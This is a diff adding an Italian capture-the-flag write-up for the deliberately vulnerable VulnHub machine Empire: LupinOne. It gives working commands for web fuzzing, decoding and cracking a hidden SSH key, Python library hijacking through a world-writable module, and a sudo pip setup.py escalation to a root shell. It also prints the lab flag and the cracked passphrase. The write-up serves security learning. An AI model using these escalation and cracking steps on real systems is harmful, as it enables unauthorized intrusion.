@@ -1,0 +1,201 @@
+🎩 CTF Writeup — Empire: LupinOne
+
+Piattaforma: VulnHub
+
+Autore box: Icex64
+
+Difficoltà: Media
+
+Target: 192.168.200.101 (rete host-only)
+
+Obiettivo: Ottenere shell come root e leggere /root/root.txt
+
+Flag: 3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
+
+
+📋 Sommario
+
+
+Ricognizione
+Enumerazione Web
+Accesso iniziale — SSH key e cracking passphrase
+Privilege Escalation — da icex64 ad arsene
+Privilege Escalation — da arsene a root
+Flag
+Lezioni apprese
+
+
+
+1. Ricognizione
+
+Prima cosa: scansione completa di porte e servizi con Nmap.
+
+bashnmap -sC -sV -p- -T4 192.168.200.101
+
+Risultato:
+
+PortaServizioVersione22/tcpSSHOpenSSH 8.480/tcpHTTPApache 2.4.48
+
+SSH 8.4 è patchato — nessun exploit diretto disponibile. L'attacco passa dal web.
+
+
+2. Enumerazione Web
+
+robots.txt
+
+Controllando http://192.168.200.101/robots.txt trovo:
+
+Disallow: /~myfiles
+
+La directory /~myfiles risponde 404 — è un depistaggio. Quello che conta è il prefisso con la tilde (~): è la convenzione mod_userdir di Apache, che mappa /~username/ alla home dell'utente corrispondente. Questo suggerisce che potrebbero esistere altre directory /~qualcosa attive.
+
+Fuzzing con ffuf
+
+bashffuf -w /usr/share/wordlists/dirb/common.txt \
+     -u "http://192.168.200.101/~FUZZ" \
+     -fc 404
+
+Trovata: /~secret/
+
+Dentro c'è un messaggio firmato da icex64 — abbiamo il nostro username. Il messaggio dice di aver nascosto la sua chiave SSH in questa directory e si vanta che non verrà crackata con fasttrack. ⚠️ Nota mentale: questo potrebbe essere ingegneria psicologica inversa.
+
+Ricerca file nascosti
+
+I file nascosti in Linux iniziano con . — nessuna wordlist standard li prefissa automaticamente, quindi construisco la query manualmente:
+
+bashffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+     -u "http://192.168.200.101/~secret/.FUZZ" \
+     -fc 404
+
+
+⚠️ Con common.txt non trovo nulla — serve la lista più grande di dirbuster. La wordlist vale solo quanto le parole che contiene.
+
+
+
+Trovato: .mysecret.txt
+
+Decodifica Base58
+
+Il contenuto del file è un blob alfanumerico. Analisi:
+
+
+Niente +, /, = → non è base64
+Non usa caratteri ambigui come 0, O, I, l → firma del base58 (usato nei wallet Bitcoin)
+
+
+bashcurl -s http://192.168.200.101/~secret/.mysecret.txt -o secret.b58
+pip install base58 --break-system-packages
+python3 -c "
+import base58
+open('id_rsa','wb').write(base58.b58decode(open('secret.b58').read().strip()))
+"
+
+Risultato: una chiave SSH privata OpenSSH cifrata (AES-256-CBC, KDF bcrypt) — protetta da passphrase.
+
+
+3. Accesso Iniziale
+
+Cracking della passphrase — SSH key
+
+bashchmod 600 id_rsa
+ssh2john id_rsa > hash.txt
+john --wordlist=/usr/share/wordlists/fasttrack.txt hash.txt
+
+Passphrase trovata: P@55w0rd!
+
+
+💡 Lezione importante: Il messaggio diceva "non la cracchi con fasttrack" — è ingegneria psicologica inversa. Ho perso tempo inutile su rockyou.txt (mezzo milione di tentativi) prima di tornare a fasttrack.txt dove la passphrase era presente fin dall'inizio. La trappola psicologica ha funzionato.
+
+
+
+Fix chiave SSH
+
+Al primo tentativo SSH:
+
+Load key "id_rsa": error in libcrypto: unsupported
+
+Causa: manca il newline finale dopo -----END OPENSSH PRIVATE KEY-----. Fix:
+
+bashecho >> id_rsa
+
+Login
+
+bashssh -i id_rsa icex64@192.168.200.101
+
+✅ Accesso ottenuto come icex64. User flag in /home/icex64/user.txt.
+
+
+4. PrivEsc — icex64 → arsene
+
+Enumerazione sudo
+
+bashsudo -l
+
+Output:
+
+(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
+
+Posso eseguire heist.py come arsene senza password. Lo script importa il modulo webbrowser.
+
+Python Library Hijacking
+
+Quando Python esegue import webbrowser, carica ed esegue tutto il codice presente in cima al file del modulo. Se quel file è scrivibile, possiamo iniettare codice arbitrario che verrà eseguito con i privilegi di chi lancia lo script.
+
+bashls -la /usr/lib/python3.9/webbrowser.py
+# -rwxrwxrwx 1 root root 24087 Oct 4 2021 /usr/lib/python3.9/webbrowser.py
+
+Il modulo ha permessi 0777 — scrivibile da chiunque. Exploit:
+
+bashecho 'import os;os.system("/bin/bash")' >> /usr/lib/python3.9/webbrowser.py
+sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
+
+✅ Shell ottenuta come arsene.
+
+
+5. PrivEsc — arsene → root
+
+Enumerazione sudo
+
+bashsudo -l
+
+Output:
+
+(root) NOPASSWD: /usr/bin/pip
+
+Pip GTFOBins
+
+pip install <dir> esegue il setup.py del pacchetto durante la fase di preparazione. Se pip gira come root, setup.py gira come root. Fonte: GTFOBins — pip.
+
+Creiamo un pacchetto malevolo:
+
+bashTF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo pip install $TF --no-build-isolation --no-index
+
+✅ Shell ottenuta come root.
+
+
+6. Flag
+
+bashcat /root/root.txt
+# 3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
+
+
+7. Lezioni Apprese
+
+#Lezione1 - La wordlist giusta fa la differenza — common.txt non bastava, serviva directory-list-2.3-medium2Riconoscere base58 dal pattern dei caratteri (no +/=, no 0OIl)3Non farsi ingannare dall'ingegneria psicologica inversa — leggere i messaggi criticamente4Python Library Hijacking funziona quando una libreria standard ha permessi eccessivi5GTFOBins è il riferimento standard per abusi di binari con sudo/SUID6Su ogni nuovo utente: sempre sudo -l come primo comando
+
+
+🛠️ Tool Utilizzati
+
+
+nmap — port scanning e service detection
+ffuf — web fuzzing
+curl — download file
+ssh2john + john — cracking passphrase SSH
+python3 + base58 — decodifica chiave
+GTFOBins — riferimento privilege escalation
+
+
+
+Writeup di Marcos Galeoni — galeoni.dev · github.com/MarcosGale03
